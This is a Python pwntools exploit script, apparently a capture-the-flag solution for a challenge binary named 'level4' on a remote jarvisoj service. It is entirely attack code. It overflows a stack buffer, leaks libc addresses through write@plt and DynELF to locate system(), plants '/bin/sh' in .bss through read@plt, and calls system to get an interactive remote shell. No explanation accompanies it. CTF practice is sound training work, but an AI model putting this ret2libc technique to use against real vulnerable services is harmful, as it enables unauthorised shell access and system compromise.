from pwn import *
conn=remote('pwn2.jarvisoj.com','9880')
#conn=process('./level4')
e=ELF('./level4')
pad=0x88
write_plt=e.symbols['write']
vul_addr=0x804844b
bss_addr=0x0804a024
def leak(address):
    payload1=flat('a'*pad,"BBBB",p32(write_plt),p32(vul_addr),p32(1),p32(address),p32(4))
    conn.sendline(payload1)
    data=conn.recv(4)
    return data
d=DynELF(leak,elf=e)
system_addr=d.lookup('system','libc')
print (hex(system_addr))
read_plt=e.symbols['read']
payload2=flat('a'*pad,"BBBB",p32(read_plt),p32(vul_addr),p32(0),p32(bss_addr),p32(8))
conn.sendline(payload2)
conn.send("/bin/sh\x00")
payload3=flat("a"*pad,"BBBB",p32(system_addr),'dead',p32(bss_addr))
conn.sendline(payload3)
conn.interactive()